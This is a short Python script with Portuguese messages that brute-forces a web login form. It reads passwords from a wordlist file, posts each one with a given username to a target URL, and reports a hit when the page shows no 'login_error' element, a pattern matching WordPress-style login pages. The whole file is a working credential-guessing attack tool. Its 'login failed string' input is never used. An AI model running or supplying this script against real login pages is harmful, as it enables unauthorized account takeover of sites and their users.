import requests
import sys
import time
from bs4 import BeautifulSoup

url = input("Enter the url target: ")
username = input("Enter the username: ")
error = input("Enter the login failed string: ")

z = """

    [*]-------------------------[*]
        Verificando servidor...
    [*]-------------------------[*]

"""

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.01)

try:
    def brute(username, url, error):
        count = 0
        for password in passwords:
            count += 1
            password = password.strip()
            print("\033[1;31m"+"[-] tentativa número [" + str(count) + "] LOGIN: " + username + " / SENHA: " + password)
            data_dict = {"user": username, "password": password}
            
            try:
                res = requests.post(url, data=data_dict)
                soup = BeautifulSoup(res.content, 'html.parser')
                div_login_error = soup.find("div", id="login_error")

                if div_login_error:
                    pass
                else:
                    print("\033[1;32m"+"[+] senha encontrada --> " + password)
                    exit()

            except requests.exceptions.ConnectionError:
                print("\033[1;31m"+"[-] erro na conexão com o servidor")
                exit()

except:
    print("\033[1;31m"+"[-] erro na conexão com o servidor")
with open("gtfoods.txt", "r") as passwords:
    brute(username, url, error)